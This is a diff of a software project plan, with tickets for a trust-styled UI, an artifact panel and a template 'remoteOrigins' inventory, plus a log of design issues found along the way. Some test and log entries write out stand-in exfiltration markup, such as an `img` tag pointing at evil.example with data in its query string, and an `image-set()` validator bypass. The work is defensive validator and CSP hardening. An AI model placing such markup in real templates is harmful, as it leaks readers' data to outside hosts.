+    Orange rail follows the OS and cannot be told otherwise, so Wolf follows the same rule or the two
+    visibly disagree for half of users.
+  - 🔴 **Two rules from § 2b are asserted by test, because they are what make the trust language
+    work:** (1) the provenance ground and rule use **no** semantic palette colour — a test asserts
+    the rendered background matches neither `warning` nor `error` nor `info` at any shade; (2)
+    **`error` red appears nowhere but severity `attacked`** — a test renders every other trust state
+    and asserts none computes to the error colour.
+  - `<Provenance kind="machine">` renders its children with **no** wrapper treatment at all.
+    `kind="model"` renders the ground, the 2px left rule, and a stamp naming
+    `worker || session` and a relative time.
+  - 🔴 **`<Severity>` has no default cause and refuses to render without one** — `level="degraded"`
+    or `"attacked"` with an empty or whitespace `cause` throws in development and renders nothing in
+    production, asserted both ways. `level="none"` renders nothing. Every level carries a **glyph as
+    well as** a colour (§ 2b's table), so the state survives a greyscale screenshot.
+- **TDD:** yes for the two asserted § 2b rules, the `Severity` cause requirement and the
+  `kind="machine"` no-op; no for the palette values themselves.
+- **Validation:**
+  - `cd web && yarn test && yarn typecheck` — confirm vitest reports **0 skipped**
+  - `cd web && yarn build` — `tsc -p tsconfig.json && vite build`; proves the theme compiles into
+    the production bundle, which `vitest run` does not
+- **Depends on:** O12
+- [ ] done
+- Notes:
+
+### W29: Wolf's artifact surface   [Status: pending | Model: sonnet]
+- **Scope:** Read a hypothesis session's artifacts and render them with Orange's own panel — the
+  concrete case that motivated revision 5's tier decision.
+- **Repo:** agent-wolf
+- **Files:** modify `api/src/orange/client.ts`, `api/src/orange/types.ts`, `api/src/app.ts`; create
+  `api/src/routes/artifacts.ts`, `api/src/routes/artifacts.test.ts`,
+  `web/src/components/ArtifactsPanel.tsx` and its test; modify `web/src/pages/HypothesisDetail.tsx`.
+  `api/src/orange/client.ts` is shared with W2 and W15 — strictly serial.
+- **Acceptance criteria:**
+  - The Orange client gains reads for `GET /agent/sessions/by-name/{name}/artifacts` and
+    `…/artifacts/file?path=…`, authenticated with `WOLF_API_KEY`. **Wolf's client has none today** —
+    no method, no type — so this is new surface, not wiring.
+  - `GET /api/hypotheses/:id/artifacts` proxies the metadata list server-side, guarded by
+    `requireSignedIn`. **Never redirect the browser to Orange** and **never log a `download_url`** —
+    both asserted, the second against captured `pino` lines.
+  - The UI renders `ArtifactPanel` **imported from `@agentkit/chat-ui/components`**, under Wolf's
+    `ThemeProvider`. A test asserts a `live` artifact's status dot computes to **Wolf's**
+    `success.main` — the same assertion `verify-package.sh` makes in Orange, made again at the point
+    of use, because that is what proves the shared component is themed by its host.
+  - The panel renders inside `Provenance kind="machine"`: artifact **metadata** is Orange's record
+    of what a container wrote, not model prose. Their contents are a different question and are out
+    of scope here.
+  - An absent session is `404 not_found`, never a `500`; a session with no artifacts renders an
+    explicit empty state.
+- **TDD:** yes for the routes and the theming assertion; no for layout.
+- **Validation:**
+  - `cd api && yarn test src/routes/artifacts src/orange/client && yarn typecheck` — confirm
+    **2 test files**
+  - `cd web && yarn test && yarn typecheck`
+- **Depends on:** O12, W28, W14
+- [ ] done
+- Notes:
+
+### W30: `remoteOrigins` — every host a template will contact   [Status: pending | Model: sonnet]
+- **Scope:** Report the full remote-host inventory W16's validator already computes and discards.
+  Small, and three tickets depend on it.
+- **Repo:** agent-wolf
+- **Files:** modify `api/src/report/template.ts`, `api/src/report/template.test.ts`.
+  🔴 **This edits W16's merged file** — W16 is done; `api/src/report/*`'s ownership row gains W30.
+- **Acceptance criteria:**
+  - `ParsedTemplate` gains **`remoteOrigins: string[]`**: the deduplicated, **sorted** set of
+    `new URL(u).origin` for every URL the validator already visits — `src`, `href`, `srcset`,
+    `poster`, `action`, `formaction`, `xlink:href`, `background`, `ping` (`template.ts:596`), plus
+    CSS `url()` and `@import`. One push in an existing loop; **do not write a second walker**.
+  - **`scriptSrcs` is unchanged.** It means "remote code and stylesheets, which a human is
+    approving as code" and W24 keeps listing it separately. `remoteOrigins` is the superset and
+    answers a different question: everything this document will fetch.
+  - A test proves the gap this closes: a template whose only remote URL is
+    `<img src="https://evil.example/px.gif">` yields an **empty** `scriptSrcs` and a
+    `remoteOrigins` of `["https://evil.example"]`. Without this, a human approves a template that
+    phones home and the review screen shows them zero remote hosts.
+  - Origins collapse: two URLs on the same host with different paths yield **one** entry; `https://a`
+    and `https://a:443` are the same origin; ordering is deterministic.
+  - A fragment-only `href="#chart"` and a `data:` URL contribute **no** origin.
+- **TDD:** yes.
+- **Validation:** `cd api && yarn test src/report/template && yarn typecheck` — confirm **1 test
+  file**, and that the pre-existing `template.test.ts` cases still pass unchanged.
+- **Depends on:** W16 *(done)*
+- [ ] done
+- Notes:
+
 ## Dependency graph
 
-39 tickets. Verified acyclic by topological sort on 2026-08-21; every `Depends on` line resolves to
-a real ticket and no ticket depends on itself transitively.
+46 tickets. Verified acyclic on 2026-08-21 and re-verified on 2026-08-24 after revision 5
+added O12, W27, W28, W29 and W30; every `Depends on` line resolves to a real ticket and no ticket
+depends on itself transitively.
 
 ```
 wave  1   O1  O4  O7  W1          ← O1, O7 done; W1 at 19/22
@@ -5211,13 +5495,20 @@ wave  4   O5  O6a O8  W5  W12
 wave  5   O6b W8  W15
 wave  6   O9  W9  W16 W18
 wave  7   O10 W10 W17 W20
-wave  8   W11 W19 W25
-wave  9   W13 W21
-wave 10   W14 W22
-wave 11   W23 X1
-wave 12   W24
-wave 13   W26
+wave  8   W11 W25 W30              ← W30 is new (revision 5); W19 now needs it
+wave  9   O12 W19 W21               ← O12 has no dependencies and may start any time
+wave 10   W28 W22                   ← W28 needs O12; W27 needs W22
+wave 11   W13 W27
+wave 12   W14
+wave 13   W23 X1
+wave 14   W24 W29
+wave 15   W26
 ```
+
+**Revision 5's UI order is `O12 → W28 → W13 → W14 → W27/W29 → W23 → W24`.** W28 must land before
+W13: it owns the theme and the two trust components, and the whole point of it running first is that
+four UI tickets consume one vocabulary rather than each inventing one. O12 depends on nothing and is
+the natural thing to start with.
 
 A wave is what the graph *permits* to run together, not what must. § "Parallelism and file
 ownership" is the binding constraint on top of it: two tickets in the same wave that share a file
@@ -5227,11 +5518,28 @@ still run serially. In wave 4, for example, O5 and O6a are independent, but O5 �
 The report layer (W15–W26) enters at wave 5 and runs alongside the product tickets rather than
 after them, because W15's store reads are what W21's frame route needs.
 
-⚠️ **X1 is at wave 11, not last.** It depends on W21 (the `report-template` route), because W9's
-amended go-live refuses a hypothesis with no template, and X1 goes live. W26 — the report layer's
+⚠️ **X1 is at wave 13, not last.** It depends on **W22**, because X1 goes live and the
+"a template must exist" gate is W22's — **corrected in revision 5, R128**: go-live has never
+required a template in W9's code, and the requirement now lands in W22 beside `spec_validation`.
+W22 depends on W21, so the `report-template` route is still transitively covered. W26 — the report layer's
 own end-to-end — is last, at wave 13.
 
 ## Discovered Issues Log
+
+### Revision 5 — the UI design (2026-08-24)
+
+Six entries from the UI design pass. The design itself is
+`design/2026-08-24-agent-wolf-ui.md`; these record what changed **in this document** and why.
+
+| # | Entry |
+| --- | --- |
+| **R125** | **THE PLAN'S "IFRAME-ONLY UI REUSE" DECISION WAS WRONG, AND A PROBE PROVED IT.** The decision recorded `web/` as "not installable"; that was a **packaging** fact, not an architectural one. `web/package.json` already declared `peerDependencies`, `main: dist/index.js` and `types: dist/index.d.ts`; the blockers were `"private": true`, one `"noEmit": true` line, and five runtime deps misfiled under `devDependencies`. **45 of 53 components take props and nothing else** — only `AgentChat`, `AgentSessionList`, `ArtifactViewer`, `ArtifactPreviewDialog`, `InlineArtifactPreview`, `WorkersPage`, `WorkerChatPanel` and `ProjectSettingsPage` touch context or `fetch`. Proved end to end on 2026-08-24: built `dist` (112 modules, zero errors), packed a 364KB tarball, installed it into a throwaway React 18.3.1 / MUI 6 / vitest app sharing no code with Orange, and rendered `ArtifactPanel` — **whose `live` status dot computed to `rgb(0, 229, 160)`, the *consumer's* `success.main`.** That assertion is the whole argument for tiered reuse and is the thing an iframe can never do. `AgentMarkdown` also escaped `<img onerror>` and `<script>` while keeping the prose, which is what makes it safe for untrusted research notes. **Three findings the probe produced that reading would not have:** (1) 🔴 a consumer **must** set `test.server.deps.inline: [/@mui/, /@agentkit/]` or every import dies with `Directory import '.../@mui/material/utils' is not supported` — an error pointing at **MUI's own ESM build**, which an executor would reasonably read as the package being broken (→ W28); (2) 🟡 the barrel export makes the tier line **notional** — importing `ArtifactPanel` pulls `AgentChat`, costing 37–45s of resolution for one test file, so O12 needs subpath exports; (3) 🟢 Orange's 11 `@mui/material/styles` imports do **not** need changing — isolated by rebuilding unpatched and still passing 4/4, which made O12 smaller than it was first written. **This is the R120 discipline applied before the ticket was authored rather than after: a package that typechecks and emits is not a package that works.** |
+| **R126** | **The UI was specified in detail and never designed, and four tickets were each inventing a trust vocabulary.** W13, W14, W23 and W24 pinned components, routes, shapes and tests, but nothing anywhere stated a screen flow, an information architecture, or a visual direction. Ten distinct "do not fully trust this" signals were scattered across them with four unrelated treatments — an `Alert severity="error"`, "a different colour treatment", "a hatched region", "a visible notice". The design's § 2 resolves them onto **two independent channels**: provenance (who wrote it; always on; **never alarming**) and severity (how much to trust it now; mostly absent; escalating). Conflating them is the trap — style model-authored content as a warning and the daily research notes, the normal useful output, look permanently broken while a real tamper alert loses all its force. W28 now owns the vocabulary and **runs before W13** so the four tickets consume one rather than inventing four. This is the same failure R116 records, spread across a UI instead of a spec. |
+| **R127** | **The board's sort key barely moves, so a hypothesis going wrong without tripping was invisible.** `readBoard` sorts by `updatedAtMs` descending (`store.ts:1228`), `updatedAtMs` comes from the trusted **state** row, and a same-state transition "returns success and appends nothing" — so a daily tick never touches it. On day 30 the board was frozen in go-live order with no notion of attention beyond `challenged`. Owner decision 2026-08-24: the board becomes an **attention queue**. The cheap part is that most of it already exists and is thrown away — W10's poller appends ` attention=<n>` to line 1 of the evaluation memory (`store.ts:583`) and `parseEvaluationSummaryLine` tokenises the whole line into `found`, requires five keys, and returns only those five (`store.ts:466-483`), dropping it on the floor. Surfacing it is one optional field and one `found.get`. `stale=<n>` joins by the same mechanism, for W10's own stated reason: the memory is written only when line 1 changes, so a signal not on line 1 has its own write suppressed. → **W27**. |
+| **R128** | **R45 was a wording defect, not a cycle, and it closes in W22.** The report-layer amendment says go-live refuses a hypothesis with no `report-template` while W21 is the only writer of one. Checked against the code: **go-live has never required a template** — W9 shipped without it — and the graph has no cycle either, since W24 → W23 → W22 → W21 means the writer exists before the gate does. The requirement moves to **W22**, and the gate goes where the plan already puts its other half: W13's criterion states the go-live gate has *exactly one server-side source*, and the pinned report block already carries `has_template` as its first field. `GET /api/hypotheses/:id` now answers both halves; W22 adds the `422` backstop for the race. **W9 is not reopened.** |
+| **R129** | **R116's two accepted gaps close by DERIVING the CSP from the approved template, and 90% of the mechanism already existed.** `script-src https:` and `img-src https:` permitted any HTTPS host on earth, and W16 reports only `script[src]`, `link[rel=stylesheet][href]` and CSS `@import` — so a template exfiltrating through `<img src="https://evil.example/?d=…">` was approved by a human who **never saw that host**. But W16's validator already walks every URL channel (`src href srcset poster action formaction xlink:href background ping` plus CSS `url()`/`@import`, `template.ts:596,895`) and requires each to be `https:`; the inventory is computed and discarded. **W30** reports it as `remoteOrigins`, **W24** shows it to the approving human, and **W21/W19** substitute it into the policy — a template referencing nothing remote now yields `script-src 'unsafe-inline'` with no host at all, strictly tighter than before. `structureHash` already freezes the template, so the origin set is frozen with it: a new origin means a new human review, which is the property `https:` never had. W19's criterion changes from a whole string literal to a skeleton with four substitution points, still asserted exactly. **What does not close:** `'unsafe-inline'` stays (inline chart code; a nonce must vary per response while `structureHash` freezes the body) and is now the only breadth left in the policy; and a permitted origin can still receive an exfiltrating request — the bound moved from "every HTTPS host" to "the hosts a human approved for this template", which is a bound, not a guarantee. |
+| **R130** | **Two documentation defects found while folding, both of the R116 class — a reference that resolves to the wrong thing.** (1) 🔴 `design/2026-08-21-agent-wolf-report-layer.md:370,426` still carries **pre-R116 copies** of § "The slot sanitiser profile, pinned as an ALLOW list" and § "The CSP header, byte-for-byte", and the companion's CSP is a **different string** — fewer directives, and `script-src https: 'unsafe-inline'` rather than `script-src 'unsafe-inline' https:`. W17 and W19 are told to copy those sections byte-for-byte **without being told which document**, so an executor who greps the design directory finds two answers. The companion's copies must be marked superseded before W17 or W19 is cut. (2) `api/src/routes/hypotheses.ts` appears **twice** in § "Parallelism and file ownership" with identical contents — harmless today, but the second copy is exactly the sort of row a later edit updates alone. Both rows were updated together in revision 5; the duplicate should be deleted. |
+
 
 Seeded from an adversarial review of revision 1 (2026-08-20, Fable at xhigh effort). Every entry
 below was independently verified against the repo before revision 2 was written. Executors append
@@ -5391,7 +5699,7 @@ close, and an executor hitting one should log it rather than invent an answer.**
 
 | # | Open item | Who is blocked |
 | --- | --- | --- |
-| **R45** | **W9's go-live cannot require a `report-template` without a cycle.** The report-layer amendment says go-live refuses a hypothesis with no template, but W21 is the only writer of one and W21 depends transitively on W9. Either go-live warns instead of refusing until W21 lands, or the amendment moves to W22. **Needs an owner decision.** | W9, W21, X1 |
+| **R45** | ✅ **RESOLVED 2026-08-24 in revision 5 — see R128. It was a wording defect, not a cycle: go-live has never required a template in W9's code, and W24 → W23 → W22 → W21 means the writer exists before the gate does. The requirement now lands in W22 beside `spec_validation`, and W9 is not reopened.** Original finding: **W9's go-live cannot require a `report-template` without a cycle.** The report-layer amendment says go-live refuses a hypothesis with no template, but W21 is the only writer of one and W21 depends transitively on W9. Either go-live warns instead of refusing until W21 lands, or the amendment moves to W22. **Needs an owner decision.** | W9, W21, X1 |
 | **R46** | **CLOSED before wave 2 ran — revision 4 had already added all four routes to W2's Scope, and W2 shipped all twenty-two.** Original finding: **W2's route list is declared "exhaustive and closed" and is not.** W5 needs `GET /agent/sessions` (list, with `worker=`) and `include_retracted=1`; W8 needs `GET /agent/attention-requests`; W12 needs `GET`/`PUT /agent/project-settings`. § "Parallelism" gives `client.ts` to W2 and W15 only, so W2 must gain them before wave 3. | W5, W8, W12 |
 | **R47** | **CLOSED — the ticket text had already decided it before O3 ran, and O3 implemented it: `minAge` is accepted, does not filter, says so in its doc comment, and a test pins identical results for `minAge=0` and `minAge=time.Hour`. The safety lives at the O8 caller, which must see a path across two passes at least `minAge` apart before deleting.** Original finding: **`O3`'s `minAge` guard cannot be honoured as specified.** `DatasetBlobLister.List(ctx, prefix)` returns keys with no timestamps and no `extension.BlobStore` implementation exposes an age. Either the seam gains an age, or the guard is dropped and the sweep relies on the prefix re-assertion alone. | O3, O8 |
 | **R48** | **`TRUSTED_KINDS` has two claimed owners** — W5 (the trusted store) and W15 (`api/src/report/kinds.ts`). One must define and the other re-export; the plan currently reads as though both define it. | W5, W15 |
@@ -5450,7 +5758,7 @@ close, and an executor hitting one should log it rather than invent an answer.**
 | **R101** | **Two owner rulings on 2026-08-21 added the plan's first two new tickets since revision 4** — W8b (`/api/auth/me` + logout, closing R100) and W2b (the twenty-third Orange route, closing R91). Ticket count 39 → 41. Both are small and both close a debt an earlier ticket found and correctly refused to fix because the file was not its. Recorded as an entry in its own right because the plan's ticket list is otherwise fixed, and a reader comparing the count against revision 4's header should find the reason rather than a discrepancy. W8b runs immediately (it shares no file with anything in flight); W2b waits for W15 to land, since W15 holds `client.ts` first. | **Informational** |
 | **R102** | **A verifier brief written by the orchestrator contained an error that would have produced a FALSE blocking defect.** W8b's verifier was told to "confirm neither `/mcp` nor `/series/download` is 401". `/mcp` **is** 401 without credentials — legitimately, from its own MCP-token guard — and W8's `api/src/app.test.ts:80-87` asserts exactly that. The real invariant is that the 401 must not come from the **cookie guard**, which the verifier proved by response **body shape** rather than by status code, and then said so plainly instead of failing the ticket. A verifier following the brief literally would have raised a blocking defect against correct code and burned a fix round. **Two lessons.** (1) The briefs are as much a source of defects as the plan is, and nothing reviews them — they are written fresh each wave by the orchestrator and go straight to an agent. (2) The instruction to verifiers to **grade the ticket, not just the code** is load-bearing and should stay in every brief; it is what turned an orchestrator error into a report instead of a false failure. Also **R103**'s sibling finding: the same ticket's criterion said "normalised the same way W8 normalises it" — W8 lower-cases but does **not** trim. | **Informational** — orchestrator practice |
 | **R103** | **`setSessionCookie` lower-cases the email but does not trim it, so an untrimmed address is what lands in the signed cookie.** `api/src/auth/session.ts:115`. W8b handles it at its own read site, so `GET /api/auth/me` is correct — but **W9, W10 and W11 mount `requireSignedIn` and read `req.wolfUser.email` directly**, and will each inherit an address with surrounding whitespace. Every downstream comparison (allowlist checks, `owner` labels on memories, the K8s label charset, which forbids spaces) is then a whitespace bug waiting to happen, and it will present as "this user's hypotheses do not appear" rather than as anything auth-shaped. **The durable fix is one call at the mint site**, in W8's file, not at three read sites. **Recommendation: add `api/src/auth/session.ts` to W9's Files line and a criterion that the mint site trims**, since W9 is the next ticket to mount the guard. Found by W8b's verifier. **Done 2026-08-21 (wave-6 pre-flight): `session.ts` + `session.test.ts` are on W9's Files line, W9 carries the trim criterion with a `"  Kai@Example.COM  "` case, and the ownership table has the row.** Separately and needing no action: `requireSignedIn` deliberately does not clear an expired cookie because the bare middleware has no config to build matching flags from — now that `POST /api/auth/logout` exists the UI has a real remedy, so that comment's premise has changed. | **Resolved** — folded into W9 |
-| **R104** | **`GET /agent/memories/current?name=` cannot do what four tickets assume it does, and for Wolf it is close to useless.** Orange builds the selector as literally `"name=" + name` (`go/httpapi/memories.go:391`) and accepts no other query parameter — no `kind=`, no `selector=`, no `include_retracted=1`. **In Wolf's vocabulary EVERY kind shares `name=<hypothesis id>`** — `hypothesis`, `hypothesis-spec`, `verdict`, `evaluation`, `report-template`, `research-note`, `report` — so the route answers with whatever the researcher happened to write most recently, whatever kind that was. It is also blind to retractions, which makes it unusable for anything the trust model touches. W15 implemented its `kind` argument as a **client-side assertion** (mismatch → `not_found`) and used `listMemories` with a `kind=,name=` selector everywhere it actually mattered, which is correct but means the route is doing almost none of the work its callers expect. **Owner decision wanted: either add a `kind=` (or `selector=`) parameter to that Orange route, or strike it from the tickets that assume it** — leaving it as-is invites a later ticket to call it and silently read the wrong row. Note this route is one of the embeddable-Orange features `docs/19-embedding.md` advertises, so the fix is not Wolf-local. | **Open** — an Orange-side ticket, or the tickets that call it |
+| **R104** | 🟡 **MITIGATED IN WOLF, still open in Orange (reviewed 2026-08-24).** `getCurrentMemory` asserts the expected `kind` client-side and throws `not_found` when the newest memory with that name is a different kind (`api/src/orange/client.ts:695-718`), so Wolf **fails loudly rather than returning the wrong memory**. The route stays unusable whenever a different kind was written more recently; fixing Orange is the owner's call and nothing in this plan is blocked on it. Original finding: **`GET /agent/memories/current?name=` cannot do what four tickets assume it does, and for Wolf it is close to useless.** Orange builds the selector as literally `"name=" + name` (`go/httpapi/memories.go:391`) and accepts no other query parameter — no `kind=`, no `selector=`, no `include_retracted=1`. **In Wolf's vocabulary EVERY kind shares `name=<hypothesis id>`** — `hypothesis`, `hypothesis-spec`, `verdict`, `evaluation`, `report-template`, `research-note`, `report` — so the route answers with whatever the researcher happened to write most recently, whatever kind that was. It is also blind to retractions, which makes it unusable for anything the trust model touches. W15 implemented its `kind` argument as a **client-side assertion** (mismatch → `not_found`) and used `listMemories` with a `kind=,name=` selector everywhere it actually mattered, which is correct but means the route is doing almost none of the work its callers expect. **Owner decision wanted: either add a `kind=` (or `selector=`) parameter to that Orange route, or strike it from the tickets that assume it** — leaving it as-is invites a later ticket to call it and silently read the wrong row. Note this route is one of the embeddable-Orange features `docs/19-embedding.md` advertises, so the fix is not Wolf-local. | **Open** — an Orange-side ticket, or the tickets that call it |
 | **R105** | **Four tickets are instructed to "reuse `present()`" and none of them can: it is module-private.** `api/src/hypothesis/spec.ts`'s `present()` helper is W3's reference implementation of **R62** ("explicit `null` means ABSENT"), and § "Vocabulary" points at it by name — but it is not exported. Every instruction to reuse it is therefore unsatisfiable without editing a file W3 owns, and the executor's only options are to duplicate the logic or to touch a file outside its Files line. **Either export it or stop pointing tickets at it.** The orchestrator's own wave-4 and wave-5 briefings repeated the instruction verbatim, which is the same class as **R102**: a briefing asserting a capability nobody checked. **Exported 2026-08-21 in the wave-6 pre-flight (`7375e09`), one word, no behaviour change.** ⚠️ **The entry as first written was also imprecise, and the imprecision is the more dangerous half: there are TWO different `present()` helpers under the same name.** W3's, `api/src/hypothesis/spec.ts:244`, is `present(record, key): boolean` and implements **R62** (explicit `null` means absent, for spec objects). W7's, `api/src/config.ts:86`, is `present(value): string \| undefined` and implements **R80** (compose forwards an unset variable as `""`). They solve unrelated problems and are not interchangeable. R80's row lists W9, W10, W11, W16, W21 and X1 as needing "the same treatment" — every one of those means the **config** helper, and every one of them adds its variables *inside* `config.ts`, so none needs an export at all. Any briefing that says "reuse `present()`" without naming the module is ambiguous between the two. | **Resolved** — exported; both helpers disambiguated above |
 | **R106** | **The board/detail tamper asymmetry W5 recorded will reappear in the report layer, and W22 is where.** W5's Notes record that `readBoard` resolves from one row per name while `readHypothesis` sees up to 50, so the two surfaces can report different `tamper` arrays for the same hypothesis. The report layer reproduces the shape exactly: **W22's board headline comes from a `latest_per` snippet read while `readLatestReport` does a per-name read**, so the same divergence returns for reports. Worth a line in W22's criteria stating the expected behaviour **before** it is found as a bug and "fixed" by widening the board read, which is the change W5's criterion deliberately does not make. | **Open** — W22 |
 | **R107** | **The per-instance `KeyedMutex` hazard is live, has now been flagged by two separate tickets, and is assigned to nobody.** W5 built transition serialisation on a `KeyedMutex` held per `HypothesisStore` **instance**, so it holds only if wolf-api constructs exactly one store for the whole process — and W8, W9 and W10 each construct their own dependencies with nothing enforcing it. W5 flagged it; W15 flagged it again while confirming its own two reads are read-only and do not worsen it. Nothing owns it. The failure mode is two concurrent transitions on one hypothesis interleaving, which is rare, non-deterministic, and writes an append-only memory — so it corrupts the record rather than erroring. **Either make the store a module-level singleton, or hoist the mutex to module scope; whichever, it needs an owner.** | **Open** — unassigned |
@@ -5464,7 +5772,7 @@ close, and an executor hitting one should log it rather than invent an answer.**
 | **R113** | **`/amend`'s source of truth was never stated, and the executor picked the safer of two readings.** W9's criterion says `/amend` "re-runs W3's validator over the amended spec" without saying where the amended spec text lives. The implementer read it from the `kind=spec-amendment` memory named by `amendment_id`, and explicitly rejected a spec supplied in the request body on the grounds that **a body-supplied spec would be a second, unaudited way for a human to set the scoreboard** — which is the same property the trust model exists to protect. That reasoning is sound and the shipped behaviour is the one to keep; this row exists so the choice is ratified in the plan rather than left as an undocumented guess that W22 or X1 might contradict. | **Resolved by ratification** — memory-sourced, not body-sourced |
 | **R114** | **Two O9 findings for whoever next owns those files, neither in O9's scope.** (1) `httpapi.DownloadDataset` orders the `DatasetScope` pin before the version lookup — correct for the non-oracle rule — but **nothing in the non-integration suite covers the interaction**. A single table case in `httpapi/datasets_test.go` presenting a scoped token against another *name* at a version that name does not have would have caught O9's blocking defect without needing Docker at all. (2) `agentdb` exposes **no way to delete a dataset row**: `ReapDatasetVersions` never deletes the highest version per name, so O9's teardown issues raw SQL through `store.DB()`. Worth knowing for O10's retention section and for any future "delete a dataset" request. Separately: `go test -tags integration ./...` at *module* scope is a trap — `go/systemtest`'s `TestMain` unconditionally shells out to `docker build ../../sandbox` and `os.Exit(1)`s rather than skipping. O9's package-scoped Validation avoids it; anyone generalising that command would not. | **Open** — one cheap httpapi case; the rest recorded |
 | **R115** | **The plan's § "The throwaway Postgres" names port 5433 and no wave has used only that port.** Concurrent Go tickets each need their own instance (R95), so every wave has supplied a different port out of band — 5434 in wave 5, 5441 in wave 6 — and every executor has had to be told the real one in its briefing. O9's implementer flagged the mismatch as a discovered issue. The section should say that 5433 is the *canonical single-ticket* instance and that a concurrent wave gets one instance per ticket on orchestrator-assigned ports, so an executor reading the plan alone does not connect to a sibling's database and wonder why its fixtures are already there. | **Open** — one paragraph in § "Executor orientation" |
-| **R116** | **Two sections that W17 and W19 are told to copy BYTE-FOR-BYTE do not exist in the plan.** W17's criterion names § "The slot sanitiser profile, pinned as an ALLOW list" as the source of `SLOT_PROFILE`; W19's names § "The CSP header, byte-for-byte" and adds that the value must be "asserted as a string literal — a substring check does not satisfy this criterion". **Neither section was ever written.** Both tickets are therefore unrunnable as specified: an executor can only invent the profile and the header, which is precisely what "byte-for-byte" exists to forbid, and the criterion would then be self-satisfying. Found by W16's implementer reading forward from its own ticket. **This must be authored before W17 or W19 is cut** — and authored by the owner, not by an executor, because the whole point of pinning them is that they are decided once, centrally, and never drifted. Same class as **R102**/**R105**/**R108**: orchestrator-authored text that no adversarial pass ever saw. | **Open** — blocks W17 and W19 |
+| **R116** | ✅ **CLOSED. Both sections were written 2026-08-22, empirically verified against `isomorphic-dompurify` ^2, and four of their own defects fixed (R120). Ratified by the owner 2026-08-24, and the CSP half superseded the same day by R129, which DERIVES the origin list from the approved template instead of allowing `https:`. ⚠️ Stale pre-R116 copies of both sections still sit in `design/2026-08-21-agent-wolf-report-layer.md:370,426` with a DIFFERENT CSP string — see R130; mark them superseded before W17 or W19 is cut.** Original finding: **Two sections that W17 and W19 are told to copy BYTE-FOR-BYTE do not exist in the plan.** W17's criterion names § "The slot sanitiser profile, pinned as an ALLOW list" as the source of `SLOT_PROFILE`; W19's names § "The CSP header, byte-for-byte" and adds that the value must be "asserted as a string literal — a substring check does not satisfy this criterion". **Neither section was ever written.** Both tickets are therefore unrunnable as specified: an executor can only invent the profile and the header, which is precisely what "byte-for-byte" exists to forbid, and the criterion would then be self-satisfying. Found by W16's implementer reading forward from its own ticket. **This must be authored before W17 or W19 is cut** — and authored by the owner, not by an executor, because the whole point of pinning them is that they are decided once, centrally, and never drifted. Same class as **R102**/**R105**/**R108**: orchestrator-authored text that no adversarial pass ever saw. | **Open** — blocks W17 and W19 |
 | **R117** | **W16's Validation could not exercise its own criterion 2, and its verifier caught it as an authoring defect rather than failing correct code.** The line read `cd api && yarn test src/report/template && yarn typecheck`. That runs exactly one file, and that file touches neither `config.ts`, `.env.example` nor `docker-compose.yml` — so the entire "two variables, three places, through `present()`" criterion was gated by nothing, with `yarn typecheck` compiling rather than exercising. Corrected to `yarn test src/report/template src/config` with a pinned 2-file count. **This is the fourth authoring error caught by an executor or a verifier rather than by review** (after R102, R105, R108) and the second surfaced by the standing instruction to *grade the ticket, not just the code*. The same verifier also used it to flag that the brief's phrase "rejects a 32-character-plus id" is loose against the pinned regex — `^[a-z][a-z0-9-]{0,31}$` makes exactly 32 legal — and graded the ticket's literal regex instead of the brief. ⚠️ **Every ticket whose Validation is a single `yarn test <one-path>` while its criteria span more than one file has this defect.** Worth one sweep before wave 7. | **Resolved** (W16) / **Open** (the sweep) |
 | **R118** | **Four minor defects stand in W16's parser, recorded rather than fixed, three of them the same shape: a URL channel the module chose to police but does not reach.** (1) **`image-set()`** is not matched by the CSS URL scanner, so `<style>.a{background:image-set("http://evil/x.png" 1x)}</style>` is accepted while the `url(...)` equivalent is refused. (2) **`iframe[srcdoc]`**, **`meta[http-equiv=refresh]`** and **`object > param[value]`** are unchecked and contribute nothing to `scriptSrcs`, so a srcdoc-hosted remote script is fetched by the browser while the go-live review screen shows the human **zero** remote scripts — which defeats criterion 10's stated purpose rather than merely narrowing it. (3) A **same-document fragment anchor is refused** — `<a href="#chart">` and `<use href="#glyph">` both fail with "must be an absolute `https:` URL", although CSS already has an explicit `#fragment` carve-out for `fill:url(#gradient)`, so the attribute path and the CSS path disagree about fragments. None is in W16's literal criteria, which name only `src` and `href`. **Recommendation: (2) is the one to fix — it silently understates the review screen — and it belongs to W21, which owns that screen. (3) wants one sentence in W25's authoring contract so the worked example is not written and then rejected.** | **Open** — (2)→W21, (3)→W25 |
 | **R119** | **The tree will hold two HTML readers with different tokenisers, as a side effect of file ownership.** W16's Files line excludes `api/package.json` (W17 owns it), so `parseTemplate` had to be hand-written with no dependency — while W17 will shortly pull **jsdom** into `api/` via `isomorphic-dompurify`. The validator and the sanitiser will then disagree about edge cases by construction, and **both of W16's blocking defects were exactly that class of disagreement**. It is a **defensible** outcome — the validator must run on stored bytes with no normalisation, which is why the structure hash forbids re-serialisation and which a DOM-based reader cannot honour — but it should be a decision on the record rather than an accident of which ticket owns `package.json`. Relatedly, § "Pinned technology choices" says "no hand-rolled tag regex" in an entry about **sanitisation**, which on a literal pass reads as forbidding W16's own parser; **one clarifying clause in that row** ("this pins the sanitiser; W16's validator is dependency-free by design") removes the contradiction. **W17's verifier should be told to check the two readers agree on the differential corpus W16's verifier already wrote** — 42 parse5 cases, in W16's test file. | **Open** — one clause, plus a W17 verifier instruction |
